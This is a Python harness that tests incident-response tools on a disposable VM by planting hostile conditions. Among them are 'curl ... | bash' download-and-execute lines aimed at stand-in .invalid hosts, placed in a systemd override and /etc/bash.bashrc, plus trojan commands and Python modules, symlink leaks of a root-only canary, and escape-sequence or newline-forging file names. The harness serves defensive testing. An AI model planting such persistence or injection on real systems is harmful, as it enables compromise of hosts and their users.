#!/usr/bin/env python3
"""Hostile-host harness: does an incident-response tool survive the host it investigates?

An IR tool runs as root on a machine the attacker may still control. This
harness plants hostile conditions on a DISPOSABLE Ubuntu VM, runs each tool
against them, and records what happened:

  robustness  can an unprivileged user hang the tool, or make it exhaust
              memory or disk? (FIFO, /dev/zero symlink, huge sparse file)
  leak        does it follow a user's symlink and copy a root-only secret
              into its output?
  cwd         launched from an attacker's directory, does it run the
              attacker's commands or Python modules as root?
  inject      does attacker text reach the analyst's terminal as escape
              sequences, or forge lines in the tool's report?
  stealth     does known-stealthy persistence show up in its output at all?

Each group runs separately, against a fresh unprivileged victim account, so
one trap can't mask another. Everything planted is recorded under
/var/lib/hh-harness and removed afterwards (`harness.py clean` recovers from
a crash). No real secret is used — the "secret" is a random canary in /root.

Usage:
  sudo python3 harness.py list
  sudo python3 harness.py run --tool ubuntils --tool chkrootkit [--set uac_dir=/opt/uac]
  sudo python3 harness.py clean

Standard library only; Python 3.9+.
"""
from __future__ import annotations

import argparse
import glob
import gzip
import json
import os
import pwd
import random
import shutil
import signal
import stat
import string
import subprocess
import sys
import tarfile
import time
import zipfile
from base64 import b64encode
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Callable, Dict, Iterable, List, Optional

HERE = Path(__file__).resolve().parent
REPO = HERE.parent.parent
STATE_DIR = Path("/var/lib/hh-harness")
STATE_FILE = STATE_DIR / "cleanup.jsonl"
VICTIM = "hh-victim"
SECRET_PATH = Path("/root/.hh-canary-secret")
HIJACK_GLOB = ".hh-hijacked-*"          # trojans touch /root/.hh-hijacked-<name>
SCAN_BUDGET = 2 * 1024 ** 3             # stop scanning one run's outputs after 2 GiB
STREAM_CHUNK = 1 << 20

# Commands a tool might run by bare name, and Python modules it might import,
# that a trojan in the working directory could shadow.
TROJAN_COMMANDS = ["ps", "ss", "netstat", "ls", "find", "cat", "grep", "awk", "sed", "lsof",
                   "uname", "hostname", "id", "stat", "date", "file", "strings", "systemctl"]
TROJAN_MODULES = ["json", "subprocess", "platform", "socket", "shutil", "logging",
                  "yaml", "click", "requests", "psutil", "distro"]


def log(msg: str) -> None:
    print(msg, flush=True)


def sh(argv: List[str], check: bool = True) -> subprocess.CompletedProcess:
    return subprocess.run(argv, check=check, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                          text=True)


# ─── cleanup records ─────────────────────────────────────────────────────────

def record(kind: str, **fields) -> None:
    STATE_DIR.mkdir(mode=0o700, parents=True, exist_ok=True)
    with open(STATE_FILE, "a") as f:
        f.write(json.dumps({"kind": kind, **fields}) + "\n")


def _remove_path(path: str) -> None:
    try:
        st = os.lstat(path)
    except FileNotFoundError:
        return
    if stat.S_ISDIR(st.st_mode):
        shutil.rmtree(path, ignore_errors=True)
    else:
        os.unlink(path)          # never follows a symlink


def _proc_exe(pid: int) -> str:
    try:
        return os.readlink(f"/proc/{pid}/exe")
    except OSError:
        return ""


def undo_all() -> List[str]:
    """Undo every recorded action in reverse. Returns the steps that failed."""
    if not STATE_FILE.exists():
        return []
    entries = [json.loads(line) for line in STATE_FILE.read_text().splitlines() if line.strip()]
    failed = []
    for e in reversed(entries):
        try:
            if e["kind"] == "pid":
                if _proc_exe(e["pid"]) == e["exe"]:      # still ours, not a reused PID
                    os.killpg(e["pid"], signal.SIGKILL)
            elif e["kind"] == "path":
                _remove_path(e["path"])
            elif e["kind"] == "restore":
                shutil.copy2(e["backup"], e["path"])
            elif e["kind"] == "user":
                sh(["userdel", "--remove", e["name"]], check=False)
                if _user_exists(e["name"]):
                    raise RuntimeError(f"user {e['name']} still exists")
        except Exception as exc:  # keep going: a half-cleaned VM is worse
            failed.append(f"{e}: {exc}")
    for marker in Path("/root").glob(HIJACK_GLOB):
        _remove_path(str(marker))
    if not failed:
        shutil.rmtree(STATE_DIR, ignore_errors=True)
    return failed


def _user_exists(name: str) -> bool:
    try:
        pwd.getpwnam(name)
        return True
    except KeyError:
        return False


# ─── planting helpers ────────────────────────────────────────────────────────

class Plant:
    """Plants artifacts for one group run and records how to undo each one."""

    def __init__(self, token: str):
        self.token = token

    def victim(self) -> Path:
        """A fresh, locked, unprivileged login user — the 'attacker' of this run."""
        sh(["useradd", "--create-home", "--shell", "/bin/bash", "--comment", "hh-harness", VICTIM])
        record("user", name=VICTIM)
        sh(["passwd", "--lock", VICTIM])
        return Path(pwd.getpwnam(VICTIM).pw_dir)

    def chown_victim(self, path: Path) -> None:
        pw = pwd.getpwnam(VICTIM)
        os.lchown(path, pw.pw_uid, pw.pw_gid)

    def file(self, path: Path, content: str, mode: int = 0o644, mtime: Optional[float] = None,
             victim: bool = False) -> None:
        _remove_path(str(path))
        record("path", path=str(path))
        path.write_text(content)
        os.chmod(path, mode)
        if victim:
            self.chown_victim(path)
        if mtime is not None:
            os.utime(path, (mtime, mtime))

    def symlink(self, path: Path, target: str, victim: bool = True) -> None:
        _remove_path(str(path))
        record("path", path=str(path))
        os.symlink(target, path)
        if victim:
            self.chown_victim(path)

    def fifo(self, path: Path) -> None:
        _remove_path(str(path))
        record("path", path=str(path))
        os.mkfifo(path, 0o644)
        self.chown_victim(path)

    def sparse(self, path: Path, size: int) -> None:
        _remove_path(str(path))
        record("path", path=str(path))
        with open(path, "wb") as f:
            f.truncate(size)
        self.chown_victim(path)

    def directory(self, path: Path) -> None:
        record("path", path=str(path))
        path.mkdir(parents=True, exist_ok=True)

    def append_with_backup(self, path: Path, text: str) -> None:
        STATE_DIR.mkdir(mode=0o700, parents=True, exist_ok=True)
        backup = STATE_DIR / (path.name + ".orig")
        shutil.copy2(path, backup)
        record("restore", path=str(path), backup=str(backup))
        with open(path, "a") as f:
            f.write(text)

    def decoy(self, exe: Path, argv0: Optional[str] = None) -> None:
        """A renamed copy of bash that only sleeps, in its own session.
        (Not a copy of sleep: Ubuntu 25.10+'s uutils sleep dispatches on its
        own name and exits when renamed.)"""
        record("path", path=str(exe))
        shutil.copy2(shutil.which("bash") or "/usr/bin/bash", exe)
        os.chmod(exe, 0o755)
        loop = "while :; do sleep 3600; done"
        if argv0 is None:
            argv = [str(exe), "-c", loop]
        else:
            # exec -a sets an attacker-chosen argv[0] (what ps shows)
            argv = [str(exe), "-c", f'exec -a "$1" {exe} -c "{loop}"', "_", argv0]
        p = subprocess.Popen(argv, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL, start_new_session=True)
        record("pid", pid=p.pid, exe=str(exe))

    def fake_pubkey(self, comment: str) -> str:
        # A well-formed ssh-ed25519 public key blob around random bytes: it
        # parses like any key, and no private key for it exists anywhere.
        blob = (b"\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x20"
                + bytes(random.getrandbits(8) for _ in range(32)))
        return f"ssh-ed25519 {b64encode(blob).decode()} {comment}"


# ─── traps ───────────────────────────────────────────────────────────────────

@dataclass
class Trap:
    id: str
    group: str
    title: str
    oracle: str                 # survive | leak | hijack | terminal | forge | visible
    marker: str = ""            # filled in per run


@dataclass
class Group:
    name: str
    category: str
    traps: List[Trap]
    plant: Callable[[Plant, Dict[str, Trap], Path], None]
    hostile_cwd: bool = False


def _plant_fifo(p: Plant, traps, cwd):
    p.fifo(p.victim() / ".bashrc")


def _plant_devzero(p: Plant, traps, cwd):
    p.symlink(p.victim() / ".profile", "/dev/zero")


def _plant_sparse(p: Plant, traps, cwd):
    p.sparse(p.victim() / ".bash_history", 16 * 1024 ** 3)


def _plant_leak(p: Plant, traps, cwd):
    home = p.victim()
    secret = traps["I1"].marker
    p.file(SECRET_PATH, f"root-only canary: {secret}\n", mode=0o600)
    (home / ".ssh").mkdir(mode=0o700, exist_ok=True)
    p.chown_victim(home / ".ssh")
    p.symlink(home / ".ssh" / "authorized_keys", str(SECRET_PATH))
    p.symlink(home / ".bash_history", str(SECRET_PATH))


def _plant_cwd(p: Plant, traps, cwd):
    p.victim()
    for name in TROJAN_COMMANDS:
        real = shutil.which(name, path="/usr/sbin:/usr/bin:/sbin:/bin") or "/bin/true"
        p.file(cwd / name, f"#!/bin/sh\n: > /root/.hh-hijacked-{name} 2>/dev/null\n"
                           f'exec {real} "$@"\n', mode=0o755)
    for mod in TROJAN_MODULES:
        # Proves execution, then steps aside and loads the real module so the
        # tool keeps working and the run isn't cut short.
        p.file(cwd / f"{mod}.py", (
            "import os as _o, sys as _s, importlib as _i\n"
            f"open('/root/.hh-hijacked-py-{mod}', 'w').close()\n"
            "_here = _o.path.dirname(_o.path.abspath(__file__))\n"
            "_s.path[:] = [x for x in _s.path if _o.path.abspath(x or '.') != _here]\n"
            "del _s.modules[__name__]\n"
            "_real = _i.import_module(__name__)\n"
            "_s.modules[__name__] = _real\n"
            "globals().update(_real.__dict__)\n"
        ))


def _plant_inject(p: Plant, traps, cwd):
    p.victim()
    esc = f"\x1b]2;{traps['I3'].marker}\x07"          # set terminal title
    forged = f"\n{traps['I4'].marker} nothing suspicious found\n"
    for base in (Path("/tmp"), Path("/dev")):
        p.file(base / f".hh-{esc}", "")
        p.file(base / f".hh-forge{forged}", "")
    p.file(Path(f"/etc/cron.d/hh-term-{p.token}"), f"# {esc}\n")
    shm = Path(f"/dev/shm/.hh-term-{p.token}")
    p.directory(shm)
    p.decoy(shm / "worker", argv0=f"worker {esc}")


def _plant_stealth(p: Plant, traps, cwd):
    home = p.victim()
    (home / ".ssh").mkdir(mode=0o700, exist_ok=True)
    p.chown_victim(home / ".ssh")
    p.file(home / ".ssh" / "authorized_keys2", p.fake_pubkey(traps["V1"].marker) + "\n",
           mode=0o600, victim=True)

    unit = Path(f"/etc/systemd/system/hh-{p.token}.service")
    p.file(unit, "[Service]\nExecStart=/usr/bin/true\n")
    dropin = Path(str(unit) + ".d")
    p.directory(dropin)
    p.file(dropin / "override.conf",
           f"[Service]\nExecStart=\nExecStart=/usr/bin/bash -c 'curl -s http://{traps['V2'].marker}"
           ".invalid/s | bash'\n")

    shm = Path(f"/dev/shm/.{traps['V3'].marker}")
    p.directory(shm)
    p.decoy(shm / "kworker")

    year_ago = time.time() - 400 * 86400
    p.file(Path(f"/etc/cron.d/hh-{p.token}"),
           f"0 0 31 2 * root /tmp/{traps['V4'].marker}.sh\n", mtime=year_ago)

    p.append_with_backup(Path("/etc/bash.bashrc"),
                         f"\ncurl -s http://{traps['V5'].marker}.invalid/b | bash  # hh-harness\n")


GROUPS: List[Group] = [
    Group("fifo", "robustness",
          [Trap("R1", "fifo", "victim's ~/.bashrc is a FIFO", "survive")], _plant_fifo),
    Group("devzero", "robustness",
          [Trap("R2", "devzero", "victim's ~/.profile is a symlink to /dev/zero", "survive")],
          _plant_devzero),
    Group("sparse", "robustness",
          [Trap("R3", "sparse", "victim's ~/.bash_history is a 16 GiB sparse file", "survive")],
          _plant_sparse),
    Group("leak", "integrity",
          [Trap("I1", "leak", "victim's authorized_keys and .bash_history are symlinks to a "
                              "root-only secret", "leak")], _plant_leak),
    Group("cwd", "integrity",
          [Trap("I2", "cwd", "tool launched from a directory of trojan commands and Python "
                             "modules", "hijack")], _plant_cwd, hostile_cwd=True),
    Group("inject", "integrity",
          [Trap("I3", "inject", "terminal escape sequences in file names, a cron file and a "
                                "process name", "terminal"),
           Trap("I4", "inject", "file names containing newlines that forge report lines",
                "forge")], _plant_inject),
    Group("stealth", "visibility",
          [Trap("V1", "stealth", "key hidden in ~/.ssh/authorized_keys2", "visible"),
           Trap("V2", "stealth", "systemd drop-in override pipes curl into bash", "visible"),
           Trap("V3", "stealth", "process named kworker running from /dev/shm", "visible"),
           Trap("V4", "stealth", "cron file with its mtime backdated a year", "visible"),
           Trap("V5", "stealth", "download-and-execute line in /etc/bash.bashrc", "visible")],
          _plant_stealth),
]
TRAPS = {t.id: t for g in GROUPS for t in g.traps}


# ─── running a tool ──────────────────────────────────────────────────────────

@dataclass
class RunResult:
    outcome: str                # exited | timeout | memory | disk | error
    returncode: Optional[int]
    duration_s: float
    peak_rss_mb: int
    disk_used_mb: int
    detail: str = ""


def _session_pids(sid: int) -> List[int]:
    pids = []
    for entry in os.listdir("/proc") if os.path.isdir("/proc") else []:
        if not entry.isdigit():
            continue
        try:
            text = Path(f"/proc/{entry}/stat").read_text()
        except OSError:
            continue
        # comm can contain spaces and ')' — fields resume after the last ')'
        fields = text[text.rfind(")") + 2:].split()
        if len(fields) > 3 and int(fields[3]) == sid:
            pids.append(int(entry))
    return pids


def _session_rss_bytes(sid: int) -> int:
    page = os.sysconf("SC_PAGE_SIZE")
    total = 0
    for pid in _session_pids(sid):
        try:
            total += int(Path(f"/proc/{pid}/statm").read_text().split()[1]) * page
        except (OSError, IndexError, ValueError):
            pass
    return total


def _kill_session(sid: int) -> None:
    try:
        os.killpg(sid, signal.SIGKILL)
    except OSError:
        pass
    for pid in _session_pids(sid):
        try:
            os.kill(pid, signal.SIGKILL)
        except OSError:
            pass


def _free_bytes(path: Path) -> int:
    st = os.statvfs(path)
    return st.f_bavail * st.f_frsize


def run_tool(cmd: List[str], cwd: Path, stdout_path: Path, stderr_path: Path, timeout: float,
             max_rss_bytes: int, max_disk_bytes: int, env: Optional[dict] = None,
             poll: float = 0.5) -> RunResult:
    free_before = _free_bytes(stdout_path.parent)
    start = time.monotonic()
    peak_rss = 0
    max_used = 0
    with open(stdout_path, "wb") as out, open(stderr_path, "wb") as err:
        try:
            proc = subprocess.Popen(cmd, cwd=cwd, stdout=out, stderr=err,
                                    stdin=subprocess.DEVNULL, start_new_session=True, env=env)
        except OSError as exc:
            return RunResult("error", None, 0.0, 0, 0, f"could not start: {exc}")
        outcome, detail = "exited", ""
        while True:
            rc = proc.poll()
            elapsed = time.monotonic() - start
            if rc is not None:
                break
            if elapsed > timeout:
                outcome, detail = "timeout", f"still running after {timeout:.0f}s"
            rss = _session_rss_bytes(proc.pid)
            peak_rss = max(peak_rss, rss)
            used = free_before - _free_bytes(stdout_path.parent)
            max_used = max(max_used, used)
            if rss > max_rss_bytes:
                outcome, detail = "memory", f"resident memory reached {rss // 2**20} MiB"
            elif used > max_disk_bytes:
                outcome, detail = "disk", f"consumed {used // 2**20} MiB of disk"
            if outcome != "exited":
                _kill_session(proc.pid)
                proc.wait()
                break
            time.sleep(poll)
        _kill_session(proc.pid)  # leftovers the tool spawned into its session
    return RunResult(outcome, proc.returncode, round(time.monotonic() - start, 1),
                     peak_rss // 2**20, max(max_used, 0) // 2**20, detail)


# ─── reading what the tool produced ──────────────────────────────────────────

def _search_stream(read: Callable[[int], bytes], needles: Iterable[bytes], found: set,
                   budget: List[int]) -> None:
    needles = [n for n in needles if n not in found]
    if not needles:
        return
    keep = max(len(n) for n in needles) - 1
    tail = b""
    while budget[0] > 0:
        chunk = read(min(STREAM_CHUNK, budget[0]))
        if not chunk:
            break
        budget[0] -= len(chunk)
        window = tail + chunk
        for n in needles:
            if n not in found and n in window:
                found.add(n)
        tail = window[-keep:] if keep else b""


def _scan_archive_member(name: str, fileobj, needles, found, budget, depth: int) -> None:
    lower = name.lower()
    if depth < 2 and lower.endswith((".tar", ".tar.gz", ".tgz", ".tar.xz", ".tar.bz2")):
        try:
            with tarfile.open(fileobj=fileobj, mode="r:*") as tf:
                _scan_tar(tf, needles, found, budget, depth + 1)
            return
        except tarfile.TarError:
            fileobj.seek(0)
    if depth < 2 and lower.endswith(".gz"):
        try:
            with gzip.GzipFile(fileobj=fileobj) as gz:
                _search_stream(gz.read, needles, found, budget)
            return
        except OSError:
            fileobj.seek(0)
    _search_stream(fileobj.read, needles, found, budget)


def _scan_tar(tf: tarfile.TarFile, needles, found, budget, depth: int) -> None:
    for member in tf:
        if budget[0] <= 0:
            return
        name_bytes = member.name.encode("utf-8", "surrogateescape")
        for n in needles:
            if n in name_bytes:
                found.add(n)
        if member.isfile():
            f = tf.extractfile(member)
            if f is not None:
                _scan_archive_member(member.name, f, needles, found, budget, depth)


def scan_outputs(paths: Iterable[Path], needles: Iterable[bytes],
                 budget_bytes: int = SCAN_BUDGET) -> set:
    """Which needles occur in these files, directories, or archives within them.

    Never follows symlinks and reads only regular files — a tool's output dir
    may itself contain the FIFO or the symlink to the secret it was fed.
    """
    needles = list(needles)
    found: set = set()
    budget = [budget_bytes]
    for root in paths:
        for path in _walk_regular(root):
            if budget[0] <= 0:
                return found
            for n in needles:
                if n in os.fsencode(path):
                    found.add(n)
            try:
                fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW | os.O_NONBLOCK)
            except OSError:
                continue
            with os.fdopen(fd, "rb") as f:
                lower = path.lower()
                if lower.endswith(".zip"):
                    try:
                        with zipfile.ZipFile(f) as zf:
                            for info in zf.infolist():
                                if not info.is_dir():
                                    with zf.open(info) as m:
                                        _search_stream(m.read, needles, found, budget)
                        continue
                    except zipfile.BadZipFile:
                        f.seek(0)
                _scan_archive_member(path, f, needles, found, budget, depth=0)
    return found


def _walk_regular(root: Path):
    try:
        st = os.lstat(root)
    except OSError:
        return
    if stat.S_ISREG(st.st_mode):
        yield str(root)
        return
    if not stat.S_ISDIR(st.st_mode):
        return
    for dirpath, dirnames, filenames in os.walk(root, followlinks=False):
        for name in filenames:
            full = os.path.join(dirpath, name)
            try:
                if stat.S_ISREG(os.lstat(full).st_mode):
                    yield full
            except OSError:
                pass


def read_capped(path: Path, cap: int = 64 * 2**20) -> bytes:
    with open(path, "rb") as f:
        return f.read(cap)


# ─── verdicts ────────────────────────────────────────────────────────────────

GOOD = {"PASS", "SEEN"}


def run_problem(profile: dict, values: Dict[str, str], run: RunResult) -> str:
    """Why this run can't be trusted to have done its job, or "" if it can.

    A tool that died at startup "passes" every robustness trap and "misses"
    every technique — so a run counts only if it exited with an expected code
    and produced the output its profile says it always produces.
    """
    if run.outcome == "exited" and run.returncode not in profile.get("ok_returncodes", [0]):
        return f"exit code {run.returncode}"
    for pattern in profile.get("expect_output", []):
        if not glob.glob(pattern.format(**values)):
            return f"no {pattern.format(**values)}"
    return ""


def judge(trap: Trap, run: RunResult, terminal: bytes, found: set, hijacked: List[str],
          broken: str = "") -> str:
    unfinished = "" if run.outcome == "exited" else f" (run ended: {run.outcome})"
    if run.outcome == "error":
        return "ERROR"
    if broken and run.outcome == "exited" and trap.oracle in ("survive", "visible"):
        # Exiting early isn't surviving, and no output isn't missing.
        return f"BROKEN-RUN ({broken})"
    if trap.oracle == "survive":
        return {"exited": "PASS", "timeout": "HANG", "memory": "MEMORY", "disk": "DISK"}[run.outcome]
    if trap.oracle == "leak":
        return ("LEAK" if trap.marker.encode() in found else "PASS") + unfinished
    if trap.oracle == "hijack":
        return (f"HIJACKED: {', '.join(sorted(hijacked))}" if hijacked else "PASS") + unfinished
    if trap.oracle == "terminal":
        seq = b"\x1b]2;" + trap.marker.encode()
        if seq in terminal:
            return "INJECTED" + unfinished
        return ("RAW-IN-REPORT" if seq in found else "PASS") + unfinished
    if trap.oracle == "forge":
        marker = trap.marker.encode()
        forged = any(line.startswith(marker) for line in terminal.splitlines())
        return ("FORGED" if forged else "PASS") + unfinished
    if trap.oracle == "visible":
        return ("SEEN" if trap.marker.encode() in found else "MISSED") + unfinished
    raise ValueError(trap.oracle)


# ─── profiles and the run loop ───────────────────────────────────────────────

def load_profiles(path: Path) -> dict:
    return json.loads(path.read_text())


def render_cmd(profile: dict, values: Dict[str, str]) -> List[str]:
    return [part.format(**values) for part in profile["cmd"]]


def tool_available(cmd: List[str], run_from: Optional[Path] = None) -> bool:
    exe = cmd[0]
    if os.sep not in exe:
        return shutil.which(exe) is not None
    path = Path(exe)
    if not path.is_absolute() and run_from is not None:
        path = run_from / path      # "./uac" means the one in the tool's own directory
    return os.access(path, os.X_OK)


def _new_token() -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))


def run_group(tool: str, profile: dict, group: Group, run_dir: Path, values: Dict[str, str],
              args) -> List[dict]:
    token = _new_token()
    traps = {t.id: Trap(**{**asdict(t), "marker": f"hh{t.id.lower()}{token}"}) for t in group.traps}
    work = run_dir / tool / group.name
    out_dir, cwd = work / "out", work / "cwd"
    out_dir.mkdir(parents=True)
    cwd.mkdir()
    run_from = profile.get("run_from")
    if run_from and group.hostile_cwd:
        # The tool can only start from its own directory, so "launched from
        # an attacker's directory" isn't a way it can be run.
        rows = []
        for trap in traps.values():
            rows.append({"tool": tool, "trap": trap.id, "group": group.name, "title": trap.title,
                         "verdict": "N/A (must run from its own directory)", "run": None})
            log(f"  {trap.id:3} N/A — {tool} only runs from its own directory")
        return rows
    run_cwd = Path(run_from.format(**values)) if run_from else cwd
    extra = {path: (os.path.getsize(path) if os.path.exists(path) else 0)
             for path in profile.get("extra_outputs", [])}
    hijacked: List[str] = []
    try:
        group.plant(Plant(token), traps, cwd)
        cmd = render_cmd(profile, {**values, "out": str(out_dir), "cwd": str(run_cwd)})
        run = run_tool(cmd, run_cwd, work / "stdout.txt", work / "stderr.txt", args.timeout,
                       args.max_rss_mb * 2**20, args.max_disk_gb * 2**30,
                       env={**os.environ, **profile.get("env", {})})
        hijacked = sorted(p.name[len(".hh-hijacked-"):] for p in Path("/root").glob(HIJACK_GLOB))
    except Exception as exc:  # a trap that can't be planted here is an ERROR, not a crash
        run = RunResult("error", None, 0.0, 0, 0, f"planting failed: {exc}")
        for name in ("stdout.txt", "stderr.txt"):
            (work / name).touch()
    finally:
        failed = undo_all()
        if failed:
            log("  ! cleanup problems: " + "; ".join(failed))
    # Appended part of logs the tool writes elsewhere (e.g. rkhunter.log)
    for path, offset in extra.items():
        if os.path.exists(path):
            with open(path, "rb") as src, open(work / ("extra-" + Path(path).name), "wb") as dst:
                src.seek(offset)
                dst.write(src.read(64 * 2**20))
    terminal = read_capped(work / "stdout.txt") + read_capped(work / "stderr.txt")
    broken = run_problem(profile, {**values, "out": str(out_dir), "cwd": str(run_cwd)}, run)
    found = scan_outputs([work], [t.marker.encode() for t in traps.values()]
                         + [b"\x1b]2;" + t.marker.encode() for t in traps.values()])
    rows = []
    for trap in traps.values():
        verdict = judge(trap, run, terminal, found, hijacked, broken)
        rows.append({"tool": tool, "trap": trap.id, "group": group.name, "title": trap.title,
                     "verdict": verdict, "run": asdict(run)})
        log(f"  {trap.id:3} {verdict:28} {trap.title}"
            + (f"  [{run.detail}]" if run.detail else ""))
    return rows


def render_markdown(rows: List[dict], baselines: Dict[str, dict]) -> str:
    tools = list(dict.fromkeys(r["tool"] for r in rows))
    lines = ["| Trap | " + " | ".join(tools) + " |", "|---|" + "---|" * len(tools)]
    base = ["baseline run"] + [
        f"{baselines[t]['outcome']} in {baselines[t]['duration_s']}s" if t in baselines else "—"
        for t in tools]
    lines.append("| " + " | ".join(base) + " |")
    for trap_id, trap in TRAPS.items():
        cells = []
        for tool in tools:
            match = [r["verdict"] for r in rows if r["tool"] == tool and r["trap"] == trap_id]
            cells.append(match[0] if match else "—")
        lines.append(f"| {trap_id} {trap.title} | " + " | ".join(cells) + " |")
    return "\n".join(lines) + "\n"


def preflight(args) -> None:
    if sys.platform != "linux":
        sys.exit("error: run this on the Linux VM under test")
    if os.geteuid() != 0:
        sys.exit("error: run as root — the tools under test run as root")
    if STATE_FILE.exists():
        sys.exit(f"error: leftovers from a previous run in {STATE_DIR} — run '{sys.argv[0]} clean'")
    if _user_exists(VICTIM):
        sys.exit(f"error: user {VICTIM} already exists — run '{sys.argv[0]} clean'")
    if Path("/var/lib/ubuntils-lab").exists():
        sys.exit("error: the ubuntils demo lab is planted — clean it first, it skews results")
    need = (args.max_disk_gb + 2) * 2**30
    if _free_bytes(Path(args.results).parent if not Path(args.results).exists()
                   else Path(args.results)) < need:
        sys.exit(f"error: need at least {args.max_disk_gb + 2} GiB free for the disk guard")
    if os.environ.get("HH_YES") != "1" and not args.yes:
        print("This plants hostile files, a locked user, decoy processes and a canary secret on\n"
              f"{os.uname().nodename}, runs each tool against them, and removes everything.\n"
              "Only on a disposable VM you control.")
        if input("Continue? [y/N] ").strip().lower() != "y":
            sys.exit("aborted")


def cmd_run(args) -> None:
    preflight(args)
    profiles = load_profiles(Path(args.profiles))
    values = {"repo": str(REPO), **dict(kv.split("=", 1) for kv in args.set)}
    # Absolute: each tool runs inside its own per-run cwd, so a relative
    # {out} would point somewhere else and every run would silently fail.
    run_dir = Path(args.results).resolve() / time.strftime("%Y%m%d-%H%M%S")
    run_dir.mkdir(parents=True)
    groups = [g for g in GROUPS if not args.group or g.name in args.group]
    rows: List[dict] = []
    baselines: Dict[str, dict] = {}
    for tool in args.tool:
        if tool not in profiles:
            log(f"skip {tool}: no profile in {args.profiles}")
            continue
        profile = profiles[tool]
        try:
            probe = render_cmd(profile, {**values, "out": "/tmp", "cwd": "/tmp"})
        except KeyError as exc:
            log(f"skip {tool}: profile needs --set {exc.args[0]}=...")
            continue
        run_from = Path(profile["run_from"].format(**values)) if profile.get("run_from") else None
        if not tool_available(probe, run_from):
            where = f" in {run_from}" if run_from else ""
            log(f"skip {tool}: {probe[0]} not found{where}")
            continue
        log(f"\n== {tool}")
        base_dir = run_dir / tool / "baseline"
        (base_dir / "out").mkdir(parents=True)
        (base_dir / "cwd").mkdir()
        base_cwd = (Path(profile["run_from"].format(**values)) if profile.get("run_from")
                    else base_dir / "cwd")
        base = run_tool(render_cmd(profile, {**values, "out": str(base_dir / "out"),
                                             "cwd": str(base_cwd)}),
                        base_cwd, base_dir / "stdout.txt", base_dir / "stderr.txt",
                        args.timeout, args.max_rss_mb * 2**20, args.max_disk_gb * 2**30,
                        env={**os.environ, **profile.get("env", {})})
        baselines[tool] = asdict(base)
        log(f"  baseline: {base.outcome} rc={base.returncode} in {base.duration_s}s")
        problem = run_problem(profile, {**values, "out": str(base_dir / "out"),
                                        "cwd": str(base_cwd)}, base)
        if base.outcome != "exited" or problem:
            log(f"  ! baseline run failed ({problem or base.outcome}) — skipping {tool}; "
                f"see {base_dir}/stderr.txt")
            baselines[tool]["outcome"] = f"broken: {problem or base.outcome}"
            continue
        for group in groups:
            log(f" [{group.category}/{group.name}]")
            rows += run_group(tool, profile, group, run_dir, values, args)
    (run_dir / "summary.json").write_text(json.dumps({"baselines": baselines, "results": rows},
                                                     indent=2))
    (run_dir / "summary.md").write_text(render_markdown(rows, baselines))
    log(f"\nResults: {run_dir}/summary.md")


def cmd_clean(args) -> None:
    if os.geteuid() != 0:
        sys.exit("error: run as root")
    failed = undo_all()
    if _user_exists(VICTIM):
        sh(["userdel", "--remove", VICTIM], check=False)
    print("\n".join(failed) if failed else "Clean.")


def cmd_list(args) -> None:
    for g in GROUPS:
        for t in g.traps:
            print(f"{t.id:3} {g.category:10} {g.name:8} {t.oracle:8} {t.title}")


def main(argv=None) -> None:
    ap = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    sub = ap.add_subparsers(dest="cmd", required=True)
    run = sub.add_parser("run", help="plant traps and run tools against them")
    run.add_argument("--tool", action="append", required=True, help="profile name (repeatable)")
    run.add_argument("--group", action="append", help="only these groups (repeatable)")
    run.add_argument("--profiles", default=str(HERE / "profiles.json"))
    run.add_argument("--set", action="append", default=[], metavar="KEY=VALUE",
                     help="fill a profile placeholder, e.g. uac_dir=/opt/uac")
    run.add_argument("--results", default="hh-results")
    run.add_argument("--timeout", type=float, default=900, help="seconds per run (default 900)")
    run.add_argument("--max-rss-mb", type=int, default=2048)
    run.add_argument("--max-disk-gb", type=int, default=4)
    run.add_argument("--yes", action="store_true", help="skip the confirmation prompt")
    run.set_defaults(func=cmd_run)
    sub.add_parser("clean", help="undo everything a crashed run left behind").set_defaults(
        func=cmd_clean)
    sub.add_parser("list", help="list the traps").set_defaults(func=cmd_list)
    args = ap.parse_args(argv)
    args.func(args)


if __name__ == "__main__":
    main()
